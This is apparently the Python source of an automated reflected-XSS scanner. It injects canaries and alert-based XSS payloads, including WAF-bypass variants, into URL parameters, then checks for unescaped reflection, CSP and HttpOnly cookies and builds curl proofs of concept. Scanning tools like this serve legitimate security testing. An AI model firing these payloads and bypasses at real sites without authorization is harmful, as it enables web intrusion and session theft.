from app.validation.safety.legacy import ValidationHTTPClient
"""XSS Validation Engine — Deep Exploitation Evidence Architecture.

Enhanced pipeline:
    Parameter → Baseline capture → Canary reflection detection →
    Content-Type gate → HTML context verification → Encoding analysis →
    Unescaped execution proof → WAF/Error page rejection →
    Multi-payload confirmation → CSP analysis → Cookie analysis → Evidence

Key anti-false-positive measures:
    1. Content-Type must be text/html — JSON/XML reflections are NOT XSS
    2. Baseline differential — if response body unchanged regardless of input, NOT XSS
    3. HTML encoding verification — &lt;&gt; encoded payloads are NOT executable XSS
    4. WAF/Error/404 page detection — reject reflections on error templates
    5. Multi-payload verification — minimum 2 different payloads must succeed

Deep Exploitation Evidence:
    - Full DOM context capture (500 chars around payload)
    - CSP header analysis (unsafe-inline, nonce, hash)
    - Cookie HttpOnly flag check (session hijack risk)
    - Multiple verified payloads for robustness proof
    - E4/EXPLOITED: Multiple payloads confirmed + no CSP + cookies accessible

Strict evidence levels:
    - E0/INFO: Marker reflected but fully encoded → observation only
    - E1/LOW: Marker reflected in non-executable HTML context
    - E2/MEDIUM: Payload reflected UNESCAPED in HTML context (event handler, attribute)
    - E3/HIGH: Payload structure intact and executable in browser
    - E4/EXPLOITED: Multiple payloads confirmed with full exploitation evidence
"""

import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, quote, urlparse

import httpx

logger = logging.getLogger("validator.xss")

# Controlled harmless canary markers — alphanumeric canary for initial reflection
REFLECTION_CANARY = "bh7x5s"

# Markers to test how server handles special characters (encoding analysis)
ENCODING_PROBES = [
    ("bh7x5s", "plain"),                  # alphanumeric baseline
    ('<bh7x5s>', "angle_bracket"),         # test if < > are encoded
    ('"bh7x5s"', "double_quote"),         # test if " is encoded
    ("'bh7x5s'", "single_quote"),         # test if ' is encoded
]

# Context-targeted XSS payloads (safe — triggers alert/confirm, no destructive action)
XSS_PAYLOADS_BY_CONTEXT = {
    "unquoted_attr": [
        {"payload": ' onmouseover=alert("BH-XSS") ', "technique": "event_handler_unquoted", "tag_match": r'on\w+\s*=\s*alert\s*\(\s*["\']?BH-XSS'},
        {"payload": ' onfocus=alert("BH-XSS") autofocus ', "technique": "autofocus_event", "tag_match": r'onfocus\s*=\s*alert\s*\(\s*["\']?BH-XSS'},
    ],
    "html_attribute": [
        {"payload": '" onmouseover="alert(\'BH-XSS\')"', "technique": "attr_breakout_event", "tag_match": r'onmouseover\s*=\s*["\']?\s*alert\s*\(\s*["\']?BH-XSS'},
        {"payload": "' onfocus='alert(\"BH-XSS\")' autofocus='", "technique": "single_quote_breakout", "tag_match": r'onfocus\s*=\s*["\']?\s*alert\s*\(\s*["\']?BH-XSS'},
    ],
    "html_body": [
        {"payload": '<img src=x onerror="alert(\'BH-XSS\')">', "technique": "img_onerror", "tag_match": r'<img\s+src=x\s+onerror\s*=\s*["\']?\s*alert\s*\(\s*["\']?BH-XSS'},
        {"payload": '<svg onload="alert(\'BH-XSS\')">', "technique": "svg_onload", "tag_match": r'<svg\s+onload\s*=\s*["\']?\s*alert\s*\(\s*["\']?BH-XSS'},
        {"payload": '<script>alert("BH-XSS")</script>', "technique": "script_tag", "tag_match": r'<script>\s*alert\s*\(\s*["\']?BH-XSS["\']?\s*\)\s*</script>'},
    ],
    "javascript": [
        {"payload": "';alert('BH-XSS');//", "technique": "js_string_breakout", "tag_match": r"alert\s*\(\s*['\"]?BH-XSS"},
        {"payload": "\";alert('BH-XSS');//", "technique": "js_dquote_breakout", "tag_match": r"alert\s*\(\s*['\"]?BH-XSS"},
    ],
    "href_src": [
        {"payload": "javascript:alert('BH-XSS')", "technique": "javascript_uri", "tag_match": r'javascript\s*:\s*alert\s*\(\s*["\']?BH-XSS'},
    ],
    "waf_bypass": [
        {"payload": '<ScRiPt>alert("BH-XSS")</ScRiPt>', "technique": "case_bypass", "tag_match": r'<[Ss][Cc][Rr][Ii][Pp][Tt]>\s*alert\s*\(\s*["\']?BH-XSS'},
        {"payload": '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">', "technique": "html_entity_bypass", "tag_match": r'<img\s+src=x\s+onerror\s*='},
        {"payload": '</textarea><script>alert("BH-XSS")</script>', "technique": "tag_close_inject", "tag_match": r'</textarea>\s*<script>\s*alert'},
    ],
}

# Patterns that indicate server-side HTML encoding (NOT vulnerable)
ENCODING_INDICATORS = {
    "angle_brackets": (re.compile(r'&lt;bh7x5s&gt;'), "HTML entity encoded < >"),
    "double_quote": (re.compile(r'&quot;bh7x5s&quot;'), "HTML entity encoded \""),
    "html_full": (re.compile(r'&#\d+;'), "Numeric HTML entity encoding"),
}

# WAF/Error/404 page signatures that should cause rejection
WAF_ERROR_SIGNATURES = [
    re.compile(r"(?:just a moment|checking your browser|attention required|cloudflare|ddos-guard)", re.I),
    re.compile(r"(?:403 forbidden|access denied|blocked|web application firewall)", re.I),
    re.compile(r"(?:404 not found|page not found|halaman tidak ditemukan)", re.I),
    re.compile(r"(?:400 bad request|invalid request|malformed)", re.I),
    re.compile(r"(?:captcha|recaptcha|hcaptcha|turnstile)", re.I),
]

# Patterns indicating dangerous reflection contexts
DANGEROUS_CONTEXTS = {
    "javascript": re.compile(r'<script[^>]*>[^<]*?bh7x5s', re.I | re.DOTALL),
    "event_handler": re.compile(r'on\w+\s*=\s*["\'][^"\']*?bh7x5s', re.I),
    "href_src": re.compile(r'(?:href|src)\s*=\s*["\'](?:javascript:)?[^"\']*?bh7x5s', re.I),
    "html_attribute": re.compile(r'<[a-z][a-z0-9]*\s+[^>]*?bh7x5s[^>]*?>', re.I),
    "unquoted_attr": re.compile(r'<[a-z][a-z0-9]*\s+[^>]*?=\s*bh7x5s', re.I),
}


@dataclass
class XSSCandidate:
    url: str
    parameter: str
    location: str
    marker: str
    context: str = "html_body"
    technique: str = "reflection"
    reflected: bool = False
    payload_executed: bool = False
    unescaped: bool = False
    confidence: str = "OBSERVED"
    evidence: dict = field(default_factory=dict)
    exploitation_data: dict = field(default_factory=dict)
    impact_matrix: dict = field(default_factory=dict)
    poc_curl: str = ""
    reproduction_steps: list = field(default_factory=list)


class XSSValidator:
    """Zero false-positive XSS validator with deep exploitation evidence."""

    def __init__(self, timeout: float = 8.0, max_params: int = 30) -> None:
        self.timeout = timeout
        self.max_params = max_params

    async def validate_url(
        self,
        url: str,
        parameters: List[dict],
        *,
        headers: Optional[dict] = None,
    ) -> List[XSSCandidate]:
        """Test all parameters for XSS vulnerabilities with strict false-positive prevention."""
        candidates: List[XSSCandidate] = []
        tested = 0

        for param in parameters[:self.max_params]:
            name = param.get("name", "")
            location = param.get("location", "query")
            if not name or location not in ("query", "body"):
                continue

            tested += 1

            # Phase 1: Baseline capture (request WITHOUT any canary)
            baseline = await self._capture_baseline(url, name, location, headers)
            if not baseline:
                continue

            # Phase 2: Canary reflection detection + context identification
            reflection = await self._test_reflection(url, name, location, headers, baseline)
            if not reflection:
                continue

            # Phase 3: Encoding analysis — determine what chars server encodes
            encoding_info = await self._test_encoding(url, name, location, headers)

            # Phase 4: If all special chars are encoded, this is NOT exploitable XSS
            if encoding_info.get("all_encoded", False):
                logger.debug("XSS: All special chars encoded for param '%s' on %s — NOT vulnerable", name, url)
                continue

            # Phase 5: Context-targeted payload execution testing with multi-payload verification
            payload_candidate = await self._test_payload_execution_deep(
                url, name, location, reflection.context, headers, encoding_info, baseline
            )

            if payload_candidate:
                payload_candidate.marker = reflection.marker
                # Phase 6: Deep exploitation evidence
                exploitation = await self._collect_exploitation_evidence(
                    url, name, location, payload_candidate, headers,
                )
                if exploitation:
                    payload_candidate.exploitation_data = exploitation

                self._enrich_candidate(payload_candidate, url, name, location)
                candidates.append(payload_candidate)
            # If no payload executed but reflection found in dangerous unescaped context,
            # only report if context is genuinely dangerous AND chars are unescaped
            elif reflection.context in ("javascript", "event_handler", "href_src") and not encoding_info.get("angle_encoded"):
                reflection.confidence = "SUSPECTED"
                reflection.evidence["evidence_level"] = "E1"
                self._enrich_candidate(reflection, url, name, location)
                candidates.append(reflection)
            # Otherwise: encoded reflection = no finding (NOT XSS)

        logger.info("XSS validation: %d params tested, %d confirmed findings on %s",
                     tested, len(candidates), url)
        return candidates

    async def _capture_baseline(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[dict]:
        """Capture baseline response to compare against injected responses."""
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

            async with ValidationHTTPClient(timeout=self.timeout, follow_redirects=True, verify=False) as client:
                if location == "query":
                    flat_params[param_name] = "harmless_test_value_12345"
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    resp = await client.post(url, data={param_name: "harmless_test_value_12345"}, headers=headers or {})

                content_type = resp.headers.get("content-type", "").lower()

                return {
                    "status_code": resp.status_code,
                    "content_type": content_type,
                    "body_length": len(resp.text),
                    "body_hash": hashlib.sha256(resp.text.encode()).hexdigest()[:16],
                    "is_html": "text/html" in content_type,
                    "is_waf": any(pat.search(resp.text) for pat in WAF_ERROR_SIGNATURES),
                    "response_headers": dict(resp.headers),
                }
        except Exception as exc:
            logger.debug("XSS baseline capture failed for %s: %s", url, exc)
            return None

    async def _test_reflection(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
        baseline: Optional[dict] = None,
    ) -> Optional[XSSCandidate]:
        """Send request with canary and check if it's reflected in HTML content."""
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

            async with ValidationHTTPClient(timeout=self.timeout, follow_redirects=True, verify=False) as client:
                if location == "query":
                    flat_params[param_name] = REFLECTION_CANARY
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    resp = await client.post(url, data={param_name: REFLECTION_CANARY}, headers=headers or {})

                body = resp.text
                content_type = resp.headers.get("content-type", "").lower()

                # Gate 1: Content-Type MUST be text/html — JSON/XML reflections are NOT XSS
                if "text/html" not in content_type and "application/xhtml" not in content_type:
                    logger.debug("XSS: Non-HTML content-type '%s' for param '%s' — skipping", content_type, param_name)
                    return None

                # Gate 2: Canary must actually appear in body
                if REFLECTION_CANARY not in body:
                    return None

                # Gate 3: Response should not be WAF/error/404 page
                if any(pat.search(body) for pat in WAF_ERROR_SIGNATURES):
                    logger.debug("XSS: WAF/error page detected for param '%s' — skipping", param_name)
                    return None

                # Gate 4: Response body must be meaningfully different from baseline
                if baseline:
                    body_hash = hashlib.sha256(body.encode()).hexdigest()[:16]
                    if body_hash == baseline.get("body_hash"):
                        logger.debug("XSS: Identical response body with/without canary for '%s' — static page", param_name)
                        return None

                # Identify context where canary was reflected
                context = self._identify_context(body, REFLECTION_CANARY)
                if not context:
                    return None

                response_hash = hashlib.sha256(body.encode()).hexdigest()[:16]

                return XSSCandidate(
                    url=url,
                    parameter=param_name,
                    location=location,
                    marker=REFLECTION_CANARY,
                    context=context,
                    reflected=True,
                    confidence="OBSERVED",
                    evidence={
                        "status_code": resp.status_code,
                        "content_type": content_type,
                        "response_hash": response_hash,
                        "reflected_marker": REFLECTION_CANARY,
                        "reflection_context": context,
                        "evidence_level": "E0",
                    },
                )

        except Exception as exc:
            logger.debug("XSS reflection test failed for %s param=%s: %s", url, param_name, exc)
            return None

    async def _test_encoding(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> dict:
        """Test how server encodes special characters — key for determining exploitability."""
        encoding_info = {
            "angle_encoded": True,
            "dquote_encoded": True,
            "squote_encoded": True,
            "all_encoded": True,
        }

        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

            async with ValidationHTTPClient(timeout=self.timeout, follow_redirects=True, verify=False) as client:
                # Test angle bracket encoding: <bh7x5s>
                if location == "query":
                    flat_params[param_name] = "<bh7x5s>"
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    resp = await client.post(url, data={param_name: "<bh7x5s>"}, headers=headers or {})

                body = resp.text
                if "<bh7x5s>" in body:
                    encoding_info["angle_encoded"] = False
                    encoding_info["all_encoded"] = False

                # Test double quote encoding: "bh7x5s"
                if location == "query":
                    flat_params[param_name] = '"bh7x5s"'
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    resp = await client.post(url, data={param_name: '"bh7x5s"'}, headers=headers or {})

                body = resp.text
                if '"bh7x5s"' in body and '&quot;bh7x5s&quot;' not in body:
                    encoding_info["dquote_encoded"] = False
                    encoding_info["all_encoded"] = False

                # Test single quote encoding: 'bh7x5s'
                if location == "query":
                    flat_params[param_name] = "'bh7x5s'"
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    resp = await client.post(url, data={param_name: "'bh7x5s'"}, headers=headers or {})

                body = resp.text
                if "'bh7x5s'" in body and "&#39;bh7x5s&#39;" not in body and "&apos;bh7x5s&apos;" not in body:
                    encoding_info["squote_encoded"] = False
                    encoding_info["all_encoded"] = False

        except Exception as exc:
            logger.debug("XSS encoding test failed for %s: %s", url, exc)

        return encoding_info

    async def _test_payload_execution_deep(
        self,
        url: str,
        param_name: str,
        location: str,
        reflection_context: str,
        headers: Optional[dict] = None,
        encoding_info: Optional[dict] = None,
        baseline: Optional[dict] = None,
    ) -> Optional[XSSCandidate]:
        """Test actual XSS payloads with multi-payload verification for deep evidence."""
        encoding_info = encoding_info or {}

        # Select payloads appropriate for the context
        context_payloads = XSS_PAYLOADS_BY_CONTEXT.get(reflection_context, [])
        # Also try html_body payloads as fallback if angle brackets are unescaped
        if reflection_context != "html_body" and not encoding_info.get("angle_encoded"):
            context_payloads = context_payloads + XSS_PAYLOADS_BY_CONTEXT.get("html_body", [])
        # Try WAF bypass payloads if initial payloads fail
        all_payloads = context_payloads + XSS_PAYLOADS_BY_CONTEXT.get("waf_bypass", [])

        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        # Track ALL successful payloads for multi-payload verification
        verified_payloads: List[Dict[str, Any]] = []
        first_candidate: Optional[XSSCandidate] = None

        for payload_def in all_payloads[:10]:  # test up to 10 payloads
            payload = payload_def["payload"]
            tag_match_pattern = re.compile(payload_def["tag_match"], re.I)

            try:
                async with ValidationHTTPClient(timeout=self.timeout, follow_redirects=True, verify=False) as client:
                    if location == "query":
                        flat_params[param_name] = payload
                        resp = await client.get(base_url, params=flat_params, headers=headers or {})
                    else:
                        resp = await client.post(url, data={param_name: payload}, headers=headers or {})

                    body = resp.text
                    content_type = resp.headers.get("content-type", "").lower()

                    # Must be HTML response
                    if "text/html" not in content_type and "application/xhtml" not in content_type:
                        continue

                    # Must not be WAF/error page
                    if any(pat.search(body) for pat in WAF_ERROR_SIGNATURES):
                        continue

                    # KEY CHECK: Is the payload reflected UNESCAPED in the HTML?
                    payload_unescaped_match = tag_match_pattern.search(body)
                    if not payload_unescaped_match:
                        # Check if payload is present but ENCODED (not exploitable)
                        encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
                        if encoded_payload in body:
                            logger.debug("XSS: Payload encoded by server for param '%s' — NOT exploitable", param_name)
                        continue

                    # CONFIRMED: Payload structure is intact and unescaped in HTML
                    response_hash = hashlib.sha256(body.encode()).hexdigest()[:16]

                    # Determine if it's truly executable (script tag, event handler)
                    is_executable = bool(re.search(
                        r'(?:<script[^>]*>.*?alert|on\w+\s*=\s*["\']?\s*alert|javascript\s*:\s*alert)',
                        body, re.I | re.DOTALL
                    ))

                    # Capture full DOM context (500 chars around payload)
                    match_pos = payload_unescaped_match.start()
                    dom_context_start = max(0, match_pos - 250)
                    dom_context_end = min(len(body), match_pos + len(payload_unescaped_match.group(0)) + 250)
                    dom_context = body[dom_context_start:dom_context_end]

                    verified_payloads.append({
                        "payload": payload,
                        "technique": payload_def["technique"],
                        "is_executable": is_executable,
                        "match_location": payload_unescaped_match.group(0)[:200],
                        "dom_context": dom_context,
                        "status_code": resp.status_code,
                        "response_hash": response_hash,
                    })

                    if not first_candidate:
                        evidence_level = "E3" if is_executable else "E2"
                        confidence = "CONFIRMED" if is_executable else "VALIDATED"

                        first_candidate = XSSCandidate(
                            url=url,
                            parameter=param_name,
                            location=location,
                            marker="",
                            context=reflection_context,
                            technique=payload_def["technique"],
                            reflected=True,
                            payload_executed=is_executable,
                            unescaped=True,
                            confidence=confidence,
                            evidence={
                                "payload": payload,
                                "technique": payload_def["technique"],
                                "payload_reflected_unescaped": True,
                                "execution_confirmed": is_executable,
                                "match_location": payload_unescaped_match.group(0)[:200],
                                "dom_context": dom_context[:500],
                                "status_code": resp.status_code,
                                "content_type": content_type,
                                "response_hash": response_hash,
                                "evidence_level": evidence_level,
                                "unescaped_context_verified": True,
                            },
                        )

            except Exception as exc:
                logger.debug("XSS payload test failed: %s", exc)

        # Multi-payload verification: upgrade evidence if 2+ payloads confirmed
        if first_candidate and len(verified_payloads) >= 2:
            first_candidate.evidence["verified_payloads_count"] = len(verified_payloads)
            first_candidate.evidence["verified_payloads"] = [
                {"payload": p["payload"], "technique": p["technique"]}
                for p in verified_payloads
            ]
            first_candidate.evidence["multi_payload_verified"] = True

        return first_candidate

    async def _collect_exploitation_evidence(
        self,
        url: str,
        param_name: str,
        location: str,
        candidate: XSSCandidate,
        headers: Optional[dict] = None,
    ) -> Optional[dict]:
        """Collect deep exploitation evidence: CSP analysis, cookie flags, session hijack risk."""
        exploitation: Dict[str, Any] = {}

        try:
            # Send a request to get response headers for analysis
            parsed = urlparse(url)
            base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

            async with ValidationHTTPClient(timeout=self.timeout, follow_redirects=True, verify=False) as client:
                if location == "query":
                    flat_params[param_name] = "test"
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    resp = await client.post(url, data={param_name: "test"}, headers=headers or {})

                resp_headers = dict(resp.headers)

                # 1. CSP Analysis
                csp = resp_headers.get("content-security-policy", "")
                csp_report = resp_headers.get("content-security-policy-report-only", "")
                x_xss_protection = resp_headers.get("x-xss-protection", "")

                csp_analysis: Dict[str, Any] = {
                    "csp_present": bool(csp),
                    "csp_report_only": bool(csp_report and not csp),
                    "csp_policy": csp[:500] if csp else "ABSENT",
                }

                if csp:
                    csp_analysis["allows_unsafe_inline"] = "'unsafe-inline'" in csp
                    csp_analysis["allows_unsafe_eval"] = "'unsafe-eval'" in csp
                    csp_analysis["has_nonce"] = "'nonce-" in csp
                    csp_analysis["has_hash"] = "'sha256-" in csp or "'sha384-" in csp

                    # Determine if CSP blocks our XSS
                    script_src_match = re.search(r"script-src\s+([^;]+)", csp)
                    if script_src_match:
                        script_src = script_src_match.group(1)
                        csp_analysis["script_src"] = script_src.strip()
                        csp_analysis["xss_blocked_by_csp"] = (
                            "'unsafe-inline'" not in script_src
                            and "'unsafe-eval'" not in script_src
                            and "*" not in script_src
                        )
                    else:
                        # No script-src → falls back to default-src
                        default_match = re.search(r"default-src\s+([^;]+)", csp)
                        if default_match:
                            default_src = default_match.group(1)
                            csp_analysis["xss_blocked_by_csp"] = (
                                "'unsafe-inline'" not in default_src
                                and "'unsafe-eval'" not in default_src
                            )
                        else:
                            csp_analysis["xss_blocked_by_csp"] = False
                else:
                    csp_analysis["xss_blocked_by_csp"] = False

                exploitation["csp_analysis"] = csp_analysis
                exploitation["x_xss_protection"] = x_xss_protection or "ABSENT"

                # 2. Cookie HttpOnly Analysis
                set_cookie_headers = [
                    v for k, v in resp.headers.multi_items()
                    if k.lower() == "set-cookie"
                ]

                cookie_analysis: Dict[str, Any] = {
                    "cookies_found": len(set_cookie_headers),
                    "cookies_without_httponly": [],
                    "cookies_without_secure": [],
                    "session_cookies": [],
                }

                session_cookie_names = {"session", "sess", "sessionid", "sid", "phpsessid", "jsessionid", "token", "auth"}

                for cookie_header in set_cookie_headers:
                    cookie_name_match = re.match(r"([^=]+)=", cookie_header)
                    if not cookie_name_match:
                        continue

                    cookie_name = cookie_name_match.group(1).strip()
                    cookie_lower = cookie_header.lower()

                    if "httponly" not in cookie_lower:
                        cookie_analysis["cookies_without_httponly"].append(cookie_name)

                    if "secure" not in cookie_lower:
                        cookie_analysis["cookies_without_secure"].append(cookie_name)

                    if any(sn in cookie_name.lower() for sn in session_cookie_names):
                        cookie_analysis["session_cookies"].append({
                            "name": cookie_name,
                            "httponly": "httponly" in cookie_lower,
                            "secure": "secure" in cookie_lower,
                            "samesite": "samesite" in cookie_lower,
                        })

                exploitation["cookie_analysis"] = cookie_analysis

                # 3. Session Hijack Risk Assessment
                session_hijack_risk = "LOW"
                if cookie_analysis["cookies_without_httponly"]:
                    session_hijack_risk = "MEDIUM"
                    if any(not c.get("httponly", True) for c in cookie_analysis.get("session_cookies", [])):
                        session_hijack_risk = "HIGH"
                if not csp_analysis.get("xss_blocked_by_csp", False):
                    if session_hijack_risk == "MEDIUM":
                        session_hijack_risk = "HIGH"
                    elif session_hijack_risk == "LOW":
                        session_hijack_risk = "MEDIUM"

                exploitation["session_hijack_risk"] = session_hijack_risk
                exploitation["execution_context"] = candidate.evidence.get("evidence_level", "E2")

                # 4. Multi-payload proof
                exploitation["verified_payloads_count"] = candidate.evidence.get("verified_payloads_count", 1)
                exploitation["payload_intact_in_dom"] = candidate.unescaped
                exploitation["dom_context_sample"] = candidate.evidence.get("dom_context", "")[:500]

        except Exception as exc:
            logger.debug("XSS exploitation evidence collection failed: %s", exc)

        return exploitation if exploitation else None

    def _enrich_candidate(
        self, candidate: XSSCandidate, url: str, param: str, location: str
    ) -> None:
        """Add impact matrix, PoC curl, and reproduction steps."""
        if candidate.payload_executed:
            severity = "HIGH"
        elif candidate.unescaped:
            severity = "MEDIUM"
        elif candidate.context in ("javascript", "event_handler", "href_src"):
            severity = "MEDIUM"
        else:
            severity = "LOW"

        # Upgrade severity based on exploitation evidence
        if candidate.exploitation_data:
            if candidate.exploitation_data.get("session_hijack_risk") == "HIGH":
                severity = "CRITICAL" if candidate.payload_executed else "HIGH"

        candidate.impact_matrix = {
            "confidentiality": "MEDIUM" if severity in ("HIGH", "MEDIUM", "CRITICAL") else "LOW",
            "integrity": "HIGH" if candidate.payload_executed else "MEDIUM" if candidate.unescaped else "LOW",
            "availability": "LOW",
            "authentication_bypass": "Possible via session theft" if candidate.payload_executed else "Unlikely",
            "data_exposure": "Cookie/session data" if candidate.payload_executed else "Limited",
            "xss_type": "Reflected",
            "business_impact": "Client-side script execution in victim's browser context" if candidate.payload_executed else "Input reflection without confirmed execution",
        }

        probe = candidate.evidence.get("payload") or candidate.marker
        candidate.poc_curl = self._generate_curl(url, param, probe, location)
        candidate.evidence["poc_curl"] = candidate.poc_curl

        execution_desc = (
            "eksekusi skrip terkonfirmasi (payload executed, unescaped in browser context)"
            if candidate.payload_executed
            else "refleksi payload UNESCAPED dalam dokumen HTML (struktur payload utuh)"
            if candidate.unescaped
            else "refleksi canary di konteks berpotensi berbahaya (memerlukan validasi manual)"
        )

        candidate.reproduction_steps = [
            f"1. Akses target URL: {url}",
            f"2. Injeksikan payload pada parameter '{param}' ({location})",
            f"3. Payload Terkontrol: {probe}",
            f"4. Jalankan perintah cURL PoC yang valid:\n```bash\n{candidate.poc_curl}\n```",
            f"5. Amati {execution_desc} dalam konteks '{candidate.context}'",
        ]
        if candidate.payload_executed:
            candidate.reproduction_steps.append(
                "6. Konfirmasi: Struktur tag/event handler XSS terdeteksi utuh (unescaped) di response HTML"
            )
        if candidate.exploitation_data:
            expl = candidate.exploitation_data
            if expl.get("csp_analysis"):
                csp = expl["csp_analysis"]
                candidate.reproduction_steps.append(
                    f"7. CSP Analysis: {'ABSENT — No protection' if not csp.get('csp_present') else 'Present but ' + ('allows unsafe-inline' if csp.get('allows_unsafe_inline') else 'blocks inline scripts')}"
                )
            if expl.get("session_hijack_risk"):
                candidate.reproduction_steps.append(
                    f"8. Session Hijack Risk: {expl['session_hijack_risk']}"
                )
            if expl.get("verified_payloads_count", 0) > 1:
                candidate.reproduction_steps.append(
                    f"9. Multi-payload verified: {expl['verified_payloads_count']} payloads confirmed"
                )

    @staticmethod
    def _identify_context(body: str, marker: str) -> Optional[str]:
        """Determine in which HTML context the marker was reflected."""
        for context_name, pattern in DANGEROUS_CONTEXTS.items():
            if pattern.search(body):
                return context_name

        if marker in body:
            return "html_body"

        return None

    @staticmethod
    def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
        """Generate valid, syntax-safe, properly encoded curl PoC reproduction command."""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        if location == "query":
            flat_params[param_name] = payload
            query_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            final_url = f"{base_url}?{query_str}" if query_str else base_url
            return f"curl -i -s -k -X GET '{final_url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"
        else:
            flat_params[param_name] = payload
            data_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            return f"curl -i -s -k -X POST '{base_url}' -d '{data_str}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"


xss_validator = XSSValidator()
